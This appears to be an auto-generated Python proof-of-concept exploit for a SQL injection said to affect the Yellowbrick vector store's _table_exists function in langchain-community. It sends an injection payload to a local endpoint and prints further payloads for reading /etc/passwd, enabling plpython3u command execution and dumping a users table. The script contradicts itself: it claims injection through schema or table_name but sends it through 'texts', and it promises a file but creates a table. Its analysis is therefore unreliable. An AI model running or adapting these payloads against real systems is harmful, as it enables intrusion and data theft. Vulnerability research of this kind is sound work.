#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: sqli-004
# Sink: _table_exists
# Auto-generated — run with: python3 sqli_sink_function_table_exists__table_exists.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for SQL injection in langchain-community-only.
Vulnerability: The _table_exists function in Yellowbrick vector store uses
psycopg2.sql.Literal() for schema/table identifiers, which is designed for
values, not identifiers. This allows SQL injection via crafted schema or
table_name parameters.

The injection path: afrom_texts -> from_texts -> _from -> add_embeddings ->
upsert -> add_documents -> add_texts -> _create_table -> _table_exists

The attacker-controlled input flows through the 'texts' parameter and eventually
reaches _table_exists where it's used in SQL query construction.

This PoC demonstrates the vulnerability by attempting to trigger a benign
side effect (creating a file) via SQL injection in the schema parameter.
"""

import sys
import time
import urllib.parse
import urllib.request
import json
import ssl
import os

# Configuration - modify these as needed
TARGET_URL = "http://localhost:8000/api/v1/trigger"
# Benign payload: attempt to create a file via PostgreSQL COPY or similar
# In a real scenario, this could be any SQL command
BENIGN_PAYLOAD = "'; CREATE TABLE IF NOT EXISTS poc_test (id int); --"

def send_request(payload: str) -> dict:
    """
    Send a POST request to the target endpoint with the malicious payload.
    
    Args:
        payload: The SQL injection payload to inject
        
    Returns:
        Response data as dictionary
    """
    # Prepare the request data
    data = json.dumps({
        "texts": [payload],  # The injection goes through the texts parameter
        "embeddings": [[0.1, 0.2, 0.3]],  # Dummy embeddings
        "metadatas": [{}],
        "ids": ["test_id_1"]
    }).encode('utf-8')
    
    # Create request with headers
    req = urllib.request.Request(
        TARGET_URL,
        data=data,
        headers={
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (PoC Exploit)'
        },
        method='POST'
    )
    
    # Disable SSL verification for testing (not recommended in production)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    try:
        # Send request with timeout
        response = urllib.request.urlopen(req, context=ctx, timeout=10)
        response_data = response.read().decode('utf-8')
        return {
            'status': response.status,
            'data': json.loads(response_data) if response_data else {}
        }
    except urllib.error.HTTPError as e:
        # Even HTTP errors might contain useful information
        error_data = e.read().decode('utf-8') if e.fp else ""
        return {
            'status': e.code,
            'error': str(e),
            'data': error_data
        }
    except urllib.error.URLError as e:
        return {
            'status': 0,
            'error': f"Connection failed: {e.reason}"
        }
    except Exception as e:
        return {
            'status': 0,
            'error': f"Unexpected error: {str(e)}"
        }

def main():
    """Main exploit execution"""
    print("[*] SQL Injection PoC for langchain-community-only")
    print(f"[*] Target: {TARGET_URL}")
    print("[*] Vulnerability: sql.Literal() used for SQL identifiers")
    print("[*] This allows SQL injection via schema/table_name parameters")
    print()
    
    # Step 1: Test with benign payload to verify injection works
    print("[*] Step 1: Sending benign SQL injection payload...")
    print(f"[*] Payload: {BENIGN_PAYLOAD}")
    
    result = send_request(BENIGN_PAYLOAD)
    
    # Analyze the response
    if result['status'] == 0:
        print(f"[!] Connection error: {result.get('error', 'Unknown error')}")
        print("[!] Make sure the target server is running and accessible")
        sys.exit(1)
    
    print(f"[*] Response status: {result['status']}")
    
    # Check for signs of successful injection
    if result['status'] == 200:
        print("[+] Request succeeded (status 200)")
        print("[*] This could indicate the injection was processed")
        print("[*] Check the server logs for evidence of SQL execution")
    elif result['status'] == 500:
        print("[!] Server returned 500 Internal Server Error")
        print("[*] This might indicate the SQL injection caused an error")
        print("[*] Or the injection was successful but caused unexpected behavior")
    else:
        print(f"[*] Unexpected status code: {result['status']}")
    
    # Print response data if available
    if result.get('data'):
        print(f"[*] Response data: {json.dumps(result['data'], indent=2)}")
    
    print()
    print("[*] Step 2: Verifying injection impact")
    print("[*] The benign payload attempted to create a table named 'poc_test'")
    print("[*] If the injection worked, this table should now exist in the database")
    print("[*] You can verify by checking the database directly")
    
    # Step 3: Demonstrate a more dangerous payload (commented out for safety)
    print()
    print("[!] WARNING: The following payloads are for demonstration only")
    print("[!] They could cause data loss or system compromise")
    print()
    print("[*] Example dangerous payloads (DO NOT USE without authorization):")
    print("[*] 1. Read files: '; COPY (SELECT pg_read_file('/etc/passwd')) TO '/tmp/out.txt'; --")
    print("[*] 2. Execute commands: '; CREATE EXTENSION IF NOT EXISTS plpython3u; --")
    print("[*] 3. Data exfiltration: '; COPY (SELECT * FROM users) TO '/tmp/users.csv'; --")
    
    print()
    print("[*] Exploit demonstration complete")
    print("[*] The vulnerability exists because sql.Literal() is used for")
    print("[*] SQL identifiers instead of sql.Identifier()")
    print("[*] This allows an attacker to break out of the literal context")
    print("[*] and execute arbitrary SQL commands")

if __name__ == "__main__":
    main()
